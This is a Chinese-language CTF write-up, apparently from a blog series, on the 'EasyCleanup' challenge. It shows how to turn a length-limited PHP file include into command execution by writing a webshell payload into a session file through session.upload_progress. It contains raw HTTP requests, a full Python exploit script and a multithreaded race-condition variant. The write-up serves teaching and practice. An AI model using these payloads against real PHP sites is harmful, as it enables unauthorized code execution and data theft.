---
title: "CTF Web 进阶三题（二）—— EasyCleanup：session.upload_progress 打文件包含"
date: "2026-10-25"
tags: ["Security", "CTF", "Web"]
excerpt: "file 参数只有 15 个字符，flag 路径却有 34 个。用 session.upload_progress 让 PHP 自己写出 /tmp/sess_abcde，再用 include 把它变成命令执行。"
series: "ctf-web-advanced"
seriesOrder: 2
---

> 题目：第五空间 2021 · EasyCleanup（CTFHub 复现）
> 环境：PHP 7.4.5 / Apache + mod_php
> 考点：LFI、`session.upload_progress`、长度受限包含、条件竞争

---

## 一、源码

```php
<?php
if(!isset($_GET['mode'])){
    highlight_file(__file__);
}else if($_GET['mode'] == "eval"){
    $shell = isset($_GET['shell']) ? $_GET['shell'] : 'phpinfo();';
    if(strlen($shell) > 15 | filter($shell) | checkNums($shell)) exit("hacker");
    eval($shell);
}

if(isset($_GET['file'])){
    if(strlen($_GET['file']) > 15 | filter($_GET['file'])) exit("hacker");
    include $_GET['file'];
}

function filter($var){
    $banned = ["while", "for", "\$_", "include", "env", "require",
               "?", ":", "^", "+", "-", "%", "*", "`"];
    foreach($banned as $ban){
        if(strstr($var, $ban)) return True;
    }
    return False;
}

function checkNums($var){
    $alphanum = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $cnt = 0;
    for($i = 0; $i < strlen($alphanum); $i++){
        for($j = 0; $j < strlen($var); $j++){
            if($var[$j] == $alphanum[$i]){
                $cnt += 1;
                if($cnt > 8) return True;
            }
        }
    }
    return False;
}
?>
```

两个分支：

1. `mode=eval` → `eval($shell)`，但 `$shell` 有长度 + 黑名单 + 字母数字数量三重限制。
2. `file=...` → `include $_GET['file']`，只有长度 + 黑名单，**没有字母数字限制**。

## 二、两条路的预算表

### 2.1 eval 分支

| 约束 | 值 |
|---|---|
| 长度 | `> 15` 直接 hacker |
| 字母数字 | `> 8` 直接 hacker |
| 黑名单 | `while for $_ include env require ? : ^ + - % * ` ` |

`system` 本身占 6 个字母，只剩 2 个给命令；`system("ls /")` 刚好 15 字符 / 8 字母数字，能列根目录，但**做不了更多**。`cat` 是 3 个字母，直接超预算；`* ?` 又被禁，glob 也用不了。

结论：eval 分支只能当侦察用，**不能作为主攻**。

### 2.2 file 分支

| 约束 | 值 |
|---|---|
| 长度 | `> 15` 直接 hacker |
| 黑名单 | 同上（无字母数字限制） |

15 个字符能包含什么？

```
/tmp/sess_abcde     ← 15 字符，正好卡满
/etc/passwd         ← 11
../../../flag       ← 14
```

## 三、陷阱：34 字符的 flag 文件

`ls /` 能看到：

```
flag_is_here_not_are_but_you_find
```

文件名 33 字符，绝对路径 34 字符。

- eval 分支：拼不出这个路径（字母数字预算 8）。
- file 分支：`strlen > 15` 直接 hacker。

**两条路都读不了它**——如果你把它当成「要直接包含的目标」，这题就死在这了。

> 我第一次做这题就死在这，最后错误地得出「环境不可解」的结论。实际上这题的目标**根本不是直接读这个文件**，而是先拿到代码执行，再 `cat` 它。

## 四、正确思路：自己造一个 15 字符以内的可控文件

`include` 的长度限制约束的是**路径长度**，不是「只能包含已有文件」。只要能在服务器上写一个路径 ≤15 字符、内容可控的文件，就能拿 shell。

PHP 自己就会写这种文件：**session 文件**。

- 默认 `session.save_path` 为空 → 落在 `/tmp`
- 文件名固定 `sess_<PHPSESSID>`
- `/tmp/sess_` 是 **10** 个字符 → PHPSESSID 取 **5** 个字符 → 路径正好 15

内容怎么控？用 **`session.upload_progress`**。

### 4.1 session.upload_progress 原理

PHP 5.4+ 的特性：当 POST 请求里存在名为 `session.upload_progress.name`（默认 `PHP_SESSION_UPLOAD_PROGRESS`）的字段，并且正在上传文件时，PHP 会把这次上传的进度写进 `$_SESSION`：

```php
$_SESSION["upload_progress_" . <字段值>] = [
    "start_time" => ..., "content_length" => ..., "files" => [...],
];
```

然后 session 被序列化写入 `save_path/sess_<sid>`。

关键点在于：**字段值完全可控**，会被原样写进 session 文件。所以把它设成

```
<?php system($_GET[0]);?>
```

session 文件里就会出现一段可执行的 PHP 代码。

### 4.2 需要满足的条件

| 条件 | 要求 | 本题实际 |
|---|---|---|
| `session.upload_progress.enabled` | On | ✅ On |
| `session.use_strict_mode` | 0（才能自定义 SID） | ✅ 0 |
| `session.save_path` | 已知且路径短 | ✅ 空 → `/tmp` |
| `session.upload_progress.cleanup` | Off 最省事；On 需要竞争 | ✅ **Off** |
| `file_uploads` | On | ✅ On |

本题 `cleanup = Off`，**上传结束后进度数据不会被清掉**，session 文件会一直留着——不需要条件竞争。

> 如果目标是 `cleanup = On`（默认值），就得边传边包含，也就是 wp 里那套 30 线程的写法。

## 五、利用步骤

### 5.1 写 session 文件

```http
POST / HTTP/1.1
Cookie: PHPSESSID=abcde
Content-Type: multipart/form-data; boundary=...

--boundary
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

<?php system($_GET[0]);?>
--boundary
Content-Disposition: form-data; name="f1"; filename="a.txt"

AAAA...(20KB)
--boundary
Content-Disposition: form-data; name="f2"; filename="b.txt"

BBBB...(20KB)
--boundary--
```

要点：

- `PHPSESSID` 必须自己指定，且 **5 个字符**（`abcde`）
- 至少两个文件字段（只有一个时 PHP 可能不写 session）
- 文件内容给大一点（20KB+），保证上传过程持续足够久
- 字段值就是我们要写进 session 的 PHP 代码

### 5.2 包含并执行

```http
GET /?file=/tmp/sess_abcde&0=id HTTP/1.1
Cookie: PHPSESSID=abcde
```

`/tmp/sess_abcde` 正好 15 字符，通过长度检查；`filter()` 也不拦（没有禁用词）。

返回里能看到：

```
upload_progress_uid=33(www-data) gid=33(www-data) groups=33(www-data)
|a:5:{s:10:"start_time";i:1792901567;...}
```

`system` 的输出夹在 session 序列化数据中间，因为 include 是把整个文件当模板输出，只执行 `<?php ... ?>` 那一段。

### 5.3 读 flag

```http
GET /?file=/tmp/sess_abcde&0=cat /flag_is_here_not_are_but_you_find
```

`0` 参数**没有任何长度/字符限制**（只有 `file` 和 `shell` 被过滤），所以想执行什么命令都行。

结果：

```
ctfhub{c6a1722732d053fa6ce0ce83}
```

## 六、完整脚本

```python
import requests

BASE = 'http://target/'
SID  = 'abcde'                    # /tmp/sess_abcde = 15 字符
SESS = '/tmp/sess_' + SID

s = requests.Session()
s.headers['User-Agent'] = 'Mozilla/5.0 ...'

# 1) 写 session
files = {
    'f1': ('a.txt', b'A' * 20000, 'text/plain'),
    'f2': ('b.txt', b'B' * 20000, 'text/plain'),
}
s.post(BASE, data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php system($_GET[0]);?>'},
       files=files, cookies={'PHPSESSID': SID})

# 2) 包含执行
r = s.get(BASE, params={'file': SESS, '0': 'cat /flag_is_here_not_are_but_you_find'},
          cookies={'PHPSESSID': SID})
print(r.text)
```

## 七、如果 cleanup = On：条件竞争版

```python
import io, threading, requests

sessid = 'abcde'
target = 'http://target/'
f = io.BytesIO(b'a' * 1024 * 50)

def write(session):
    while True:
        session.post(target,
                     data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php system($_GET[0]);?>'},
                     files={'f': ('x.txt', f)},
                     cookies={'PHPSESSID': sessid})

def read(session):
    while True:
        r = session.post(f"{target}?file=/tmp/sess_{sessid}&0=cat /flag...")
        if 'ctfhub{' in r.text:
            print(r.text)
            break

# 各开 20~30 个线程跑 write / read
```

原理：`cleanup=On` 时上传一结束进度数据就被删，只能在「还在上传」的窗口里包含到文件。上传大文件 + 多线程反复读，命中窗口即可。

## 八、踩坑记录

| # | 现象 | 原因 | 解决 |
|---|---|---|---|
| 1 | `?file=/flag_is_here_not_are_but_you_find` 返回 `hacker` | 34 字符超 15 | 换成 session 文件这条短路径 |
| 2 | `?file=/tmp/sess_abcde` 第一次包含时没有代码 | 上传还没落盘 / 字段名不对 | 确认字段名 `PHP_SESSION_UPLOAD_PROGRESS`，文件给大一点 |
| 3 | 包含成功但 flag 没看到 | 输出夹在序列化数据中间 | 搜整个响应，不要只看结尾 |
| 4 | `cleanup=On` 时偶尔成功 | 条件竞争 | 多线程 + 持续重试 |
| 5 | 想直接 `?file=/flag` | 服务器上根本没有 `/flag` | 先 `ls /` 确认真实文件名 |

## 九、这道题真正教的东西

**「include 长度受限」不等于「只能包含已知的短文件」。**

看到这种组合，脑子里应该立刻跳出这张表：

| 可控文件 | 路径 | 长度 | 谁能写 |
|---|---|---|---|
| session 文件 | `/tmp/sess_<sid>` | 10 + sid 长度 | PHP 自己（`session.upload_progress`） |
| 上传临时文件 | `/tmp/phpXXXXXX` | 13 | PHP 自己（需要竞争） |
| 日志 | `/var/log/apache2/access.log` | 通常太长 | Apache |
| `/proc/self/environ` | — | 18 | 需要能控 header |

本题 `save_path=/tmp` + `sess_` 前缀 + 5 字符 sid，刚好凑出 15 字符，是出题人精心设计的。

## 十、和另外两题的关系

- 和 [PHP 无字母数字 RCE](/posts/ctf-web-basics-3-php-noalnum/) 一样，都是「**在限制里找替代路径**」：那题是用符号拼出字母，这题是用短路径绕过长路径。
- 和 [Yii2 反序列化](/posts/ctf-web-advanced-1-yii2/) 一样，最后都要落到「拿代码执行 → 读 flag」，中间的限制只是障碍。

## 相关

- 题目来源：第五空间 2021 EasyCleanup
- 参考：<https://cloud.tencent.com.cn/developer/article/2287096>
